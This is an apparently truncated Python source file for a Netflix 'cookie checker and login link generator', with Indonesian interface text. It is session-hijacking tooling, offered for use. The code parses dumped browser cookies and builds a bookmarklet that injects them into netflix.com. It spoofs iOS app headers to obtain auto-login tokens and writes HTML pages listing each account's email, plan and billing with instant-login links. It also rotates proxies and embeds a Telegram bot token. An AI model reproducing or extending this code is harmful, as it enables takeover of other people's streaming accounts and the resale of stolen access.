import json
import os
import re
import sys
import time
import csv
import queue
import webbrowser
from threading import Thread, Lock, Event
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.exceptions import RequestException, ConnectionError
from http.client import RemoteDisconnected
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

# Try importing tkinter for GUI
try:
    import tkinter as tk
    from tkinter import filedialog, messagebox, ttk
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

# Reconfigure stdout/stderr to prevent UnicodeEncodeError with emojis on Windows terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(errors="replace")

# ─────────────────────────────────────────────────────────────────────────────
# Initialization & Console Settings
# ─────────────────────────────────────────────────────────────────────────────
init()

BANNER = f"""{Fore.RED}
  _   _      _    __ _ _
 | \\ | | ___| |_ / _| (_)_  __
 |  \\| |/ _ \\ __| |_| | \\ \\/ /
 | |\\  |  __/ |_|  _| | |>  <
 |_| \\_|\\___|\\__|_| |_|_/_/\\_\\
{Fore.YELLOW}      Cookie Checker & Login Link Generator (Upgraded)
{Style.RESET_ALL}"""

# ─────────────────────────────────────────────────────────────────────────────
# Global State & Locking
# ─────────────────────────────────────────────────────────────────────────────
working_cookies_path = "working_cookies"
lock = Lock()
stop_event = Event()
gui_mode = False

# UI Queue for main thread execution
ui_queue = queue.Queue()

# Stats Counter
stats = {
    "total": 0,
    "checked": 0,
    "working": 0,
    "expired": 0,
    "duplicate": 0,
    "extra_member": 0,
    "errors": 0
}

active_accounts = []
checked_emails = set()

# Checker configuration
max_retries = 3
num_threads = 5

# Proxy globals
valid_proxies: list = []
proxy_index = 0
USE_PROXY = False
proxy_type = "http"

# Callbacks for GUI or CLI
trigger_result_found = None
trigger_expired_found = None
trigger_error_found = None
trigger_duplicate_found = None

def dispatch_callback(callback_func, *args):
    """
    Dispatch status callbacks thread-safely.
    Runs immediately under lock if in CLI mode, or posts to the UI queue in GUI mode.
    """
    if not callback_func:
        return
    if gui_mode:
        ui_queue.put(lambda: callback_func(*args))
    else:
        with lock:
            callback_func(*args)

# ─────────────────────────────────────────────────────────────────────────────
# JSON & Netscape Cookie Parsing Helpers
# ─────────────────────────────────────────────────────────────────────────────

def parse_cookies_file(filepath: str) -> list | None:
    """
    Parse a cookie file. Automatically detects Netscape or JSON formats,
    supports HttpOnly tags, and outputs standard dict format.
    """
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read().strip()
            
        # Try JSON format first
        try:
            cookies = json.loads(content)
            if isinstance(cookies, list):
                return cookies
        except json.JSONDecodeError:
            pass
            
        # Fallback to Netscape format parsing
        cookies = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#") and not line.startswith("#HttpOnly_"):
                continue
            fields = line.split("\t")
            if len(fields) >= 7:
                cookie = {
                    "domain": fields[0],
                    "path": fields[2],
                    "secure": fields[3].upper() == "TRUE",
                    "httpOnly": fields[1].upper() == "TRUE" or fields[0].startswith("#HttpOnly_"),
                    "name": fields[5],
                    "value": fields[6],
                    "expirationDate": int(fields[4]) if fields[4].isdigit() else 2147483647,
                    "sameSite": "unspecified"
                }
                if cookie["domain"].startswith("#HttpOnly_"):
                    cookie["domain"] = cookie["domain"][len("#HttpOnly_"):]
                cookies.append(cookie)
                
        if cookies:
            return cookies
            
    except Exception as e:
        print(f"Error parsing cookies file {filepath}: {e}")
    return None

def generate_cookie_editor_json(cookies: list) -> str:
    """Generate cookie JSON in Cookie-Editor extension format."""
    cleaned = []
    for c in cookies:
        if not isinstance(c, dict) or "name" not in c or "value" not in c:
            continue
        cleaned.append({
            "name": c["name"],
            "value": c["value"],
            "domain": c.get("domain", ".netflix.com"),
            "path": c.get("path", "/"),
            "secure": c.get("secure", True),
            "httpOnly": c.get("httpOnly", False),
            "sameSite": c.get("sameSite", "unspecified"),
            "expirationDate": c.get("expirationDate", 2147483647)
        })
    return json.dumps(cleaned, indent=2)

def generate_bookmarklet(cookies: list) -> str:
    """Generate JavaScript bookmarklet login link from cookie data (for mobile)."""
    cleaned = []
    for c in cookies:
        if not isinstance(c, dict) or "name" not in c or "value" not in c:
            continue
        cleaned.append({
            "name": c["name"],
            "value": c["value"],
            "domain": c.get("domain", ".netflix.com"),
            "path": c.get("path", "/"),
            "secure": c.get("secure", True)
        })
    
    js_code = (
        "javascript:(function(){"
        f"var c={json.dumps(cleaned, separators=(',', ':'))};"
        "c.forEach(function(o){"
        "document.cookie=o.name+'='+o.value"
        "+';domain='+(o.domain||'.netflix.com')"
        "+';path='+(o.path||'/')"
        "+(o.secure?';secure':'')"
        "+';expires=Tue, 19 Jan 2038 03:14:07 UTC';"
        "});"
        "location.reload();"
        "})();"
    )
    return js_code

# ─────────────────────────────────────────────────────────────────────────────
# NFToken Auto-Login Generator Utilities
# ─────────────────────────────────────────────────────────────────────────────
BOT_TOKEN = "8946982094:AAFzX_iUPUwftGC7dV21xo179JT6nV1mW20"
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Jakarta",
}

def fetch_nftoken_session(session: requests.Session) -> str | None:
    """Fetch auto-login nftoken from Netflix API using the active session."""
    import urllib.parse
    try:
        orig_headers = dict(session.headers)
        session.headers.update(NFTOKEN_BASE_HEADERS)
        
        # Ensure NetflixId cookie is unquoted in the session cookies
        netflix_id = session.cookies.get("NetflixId", domain=".netflix.com")
        if netflix_id and "%" in netflix_id:
            session.cookies.set("NetflixId", urllib.parse.unquote(netflix_id), domain=".netflix.com")
            
        r = session.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, timeout=15, verify=False)
        
        session.headers.clear()
        session.headers.update(orig_headers)
        
        if r.status_code == 200:
            data = r.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            return token_data.get("token")
    except Exception:
        pass
    return None

def generate_login_html(cookies: list, account_info: dict) -> str:
    """
    Generate a self-contained HTML login page for a single account.
    Supports only the Instant Login Link (nftoken) with a strict 30-minute expiration countdown.
    """
    email = account_info.get("email", "Unknown")
    plan = account_info.get("plan", "Unknown")
    country = account_info.get("country", "Unknown")
    resolution = account_info.get("resolution", "Unknown")
    billing = account_info.get("billing", "Unknown")
    payment = account_info.get("payment", "Unknown")
    profiles = account_info.get("profiles", [])
    profiles_str = ", ".join(profiles) if profiles else "-"
    nftoken = account_info.get("nftoken")
    checked_at = account_info.get("checked_at", "")
    
    epoch_now = int(time.time())
    
    if not nftoken:
        nftoken_section = """
        <div class="error-banner" style="display: block;">
            ⚠️ Token Login Instan tidak tersedia untuk akun ini.
        </div>
        """
    else:
        nftoken_section = f"""
        <div id="countdown-container" class="countdown-box">
            <div class="countdown-label">TAUTAN KEDALUWARSA DALAM</div>
            <div id="countdown-timer" class="countdown-time">30:00</div>
        </div>

        <div id="login-actions" style="display: flex; flex-direction: column; gap: 12px; margin-top: 15px;">
            <a id="btn-pc" href="https://netflix.com/?nftoken={nftoken}" target="_blank" class="btn">
                <span>🖥️</span> Login di PC / Laptop / TV
            </a>
            <a id="btn-mobile" href="https://netflix.com/unsupported?nftoken={nftoken}" target="_blank" class="btn btn-indigo">
                <span>📱</span> Login di HP / Mobile
            </a>
        </div>
        """

    return f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Netflix Instant Login — {email}</title>
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  body {{ font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #09090B; color: #E4E4E7; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }}
  .card {{ background: #161618; border: 1px solid #2A2A2E; border-radius: 16px; padding: 36px 40px; max-width: 480px; width: 100%; box-shadow: 0 20px 50px rgba(0,0,0,0.6); position: relative; overflow: hidden; }}
  .header {{ display: flex; align-items: center; gap: 12px; margin-bottom: 24px; }}
  .netflix-icon {{ width: 36px; height: 36px; background: #E50914; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 20px; color: #fff; }}
  h1 {{ color: #FAFAFA; font-size: 20px; font-weight: 700; }}
  
  .error-banner {{ display: none; background: rgba(239, 68, 68, 0.15); border: 1px solid #EF4444; border-radius: 8px; padding: 12px 16px; color: #FCA5A5; font-size: 13px; font-weight: 600; text-align: center; margin-bottom: 20px; }}
  
  .info {{ background: #202023; border: 1px solid #2A2A2E; border-radius: 10px; padding: 16px 20px; margin-bottom: 24px; }}
  .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 10px 20px; }}
  .info-item .label {{ color: #8E8E93; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px; }}
  .info-item .value {{ color: #E4E4E7; font-size: 13px; font-weight: 600; }}
  .info-item .value.accent {{ color: #E50914; }}
  
  .countdown-box {{ background: #09090B; border: 1px solid #2A2A2E; border-radius: 10px; padding: 16px; text-align: center; margin-bottom: 24px; }}
  .countdown-label {{ color: #8E8E93; font-size: 11px; font-weight: 750; letter-spacing: 1px; margin-bottom: 4px; }}
  .countdown-time {{ color: #FAFAFA; font-size: 28px; font-weight: 800; font-family: monospace; }}
  
  .btn {{ display: flex; align-items: center; justify-content: center; gap: 8px; background: #E50914; color: #fff; border: none; padding: 14px 24px; border-radius: 8px; font-size: 14px; font-weight: 700; cursor: pointer; width: 100%; transition: all 0.2s; text-decoration: none; text-align: center; }}
  .btn:hover {{ background: #F40D17; transform: translateY(-1px); box-shadow: 0 4px 15px rgba(229,9,20,0.4); }}
  .btn:active {{ transform: translateY(0); }}
  .btn.btn-indigo {{ background: #4F46E5; }}
  .btn.btn-indigo:hover {{ background: #4338CA; box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4); }}
  
  .btn.disabled {{ background: #2A2A2E !important; color: #8E8E93 !important; cursor: not-allowed !important; pointer-events: none !important; box-shadow: none !important; transform: none !important; }}
  
  .footer {{ text-align: center; margin-top: 24px; font-size: 11px; color: #8E8E93; }}
</style>
</head>
<body>
<div class="card">
  <div id="expiry-banner" class="error-banner">
    ⚠️ Tautan login instan telah kedaluwarsa.
  </div>

  <div class="header">
    <div class="netflix-icon">N</div>
    <h1>Netflix Instant Login</h1>
  </div>
  
  <div class="info">
    <div class="info-grid">
      <div class="info-item" style="grid-column: 1/-1;"><div class="label">Email</div><div class="value">{email}</div></div>
      <div class="info-item"><div class="label">Plan</div><div class="value accent">{plan}</div></div>
      <div class="info-item"><div class="label">Country</div><div class="value">{country}</div></div>
      <div class="info-item"><div class="label">Resolution</div><div class="value">{resolution}</div></div>
      <div class="info-item"><div class="label">Billing</div><div class="value">{billing}</div></div>
      <div class="info-item" style="grid-column: 1/-1;"><div class="label">Profiles</div><div class="value">{profiles_str}</div></div>
    </div>
  </div>

  {nftoken_section}
  
  <p class="footer">Netflix Cookie Checker — Checked at {checked_at}</p>
</div>

<script>
  const checkedAtEpoch = {epoch_now} * 1000;
  const expirationDuration = 30 * 60 * 1000; // 30 minutes
  
  function updateCountdown() {{
    const now = new Date().getTime();
    const elapsed = now - checkedAtEpoch;
    const remaining = expirationDuration - elapsed;
    
    if (remaining <= 0) {{
      clearInterval(timerInterval);
      document.getElementById('expiry-banner').style.display = 'block';
      const timerEl = document.getElementById('countdown-timer');
      if (timerEl) {{
        timerEl.textContent = '00:00';
        timerEl.style.color = '#EF4444';
      }}
      const btnPc = document.getElementById('btn-pc');
      const btnMobile = document.getElementById('btn-mobile');
      if (btnPc) btnPc.classList.add('disabled');
      if (btnMobile) btnMobile.classList.add('disabled');
    }} else {{
      const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
      
      const minStr = String(minutes).padStart(2, '0');
      const secStr = String(seconds).padStart(2, '0');
      
      const timerEl = document.getElementById('countdown-timer');
      if (timerEl) {{
        timerEl.textContent = minStr + ':' + secStr;
        if (remaining < 5 * 60 * 1000) {{
          timerEl.style.color = '#F59E0B';
        }}
      }}
    }}
  }}
  
  updateCountdown();
  const timerInterval = setInterval(updateCountdown, 1000);
</script>
</body>
</html>"""

# ─────────────────────────────────────────────────────────────────────────────
# Account Page Extraction Helpers
# ─────────────────────────────────────────────────────────────────────────────

def decode_hex_escapes(s: str) -> str:
    """Decode \\xNN and \\uNNNN escape sequences safely."""
    if not s:
        return s
    try:
        s = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), s)
        s = re.sub(r'\\u([0-9A-Fa-f]{4})', lambda m: chr(int(m.group(1), 16)), s)
    except Exception:
        pass
    return s

def find_key_recursive(data, target_key):
    """Recursively search for a key inside nested dicts/lists."""
    if isinstance(data, dict):
        if target_key in data:
            return data[target_key]
        for k, v in data.items():
            res = find_key_recursive(v, target_key)
            if res is not None:
                return res
    elif isinstance(data, list):
        for item in data:
            res = find_key_recursive(item, target_key)
            if res is not None:
                return res
    return None

def extract_val(obj):
    """If obj is a dict like {'fieldType': 'String', 'value': '...'}, extract the value."""
    if isinstance(obj, dict) and "value" in obj:
        return obj["value"]
    return obj

def extract_profiles_regex(html: str) -> list:
    """Find profile names directly from the HTML GraphQL data block using guid/name windows."""
    profiles = []
    matches = re.finditer(r'"guid"\s*:\s*"([^"]+)"', html)
    for m in matches:
        guid = m.group(1)
        start = max(0, m.start() - 300)
        end = min(len(html), m.end() + 300)
        window = html[start:end]
        name_match = re.search(r'"name"\s*:\s*"([^"]+)"', window)
        if name_match:
            name = name_match.group(1)
            if name not in profiles and name not in ["Netflix", "websiteMember", "yourAccount"]:
                if '"Profile"' in window or '__typename' in window:
                    profiles.append(decode_hex_escapes(name))
    return profiles

def extract_advanced_info(html: str) -> dict:
    """
    Extract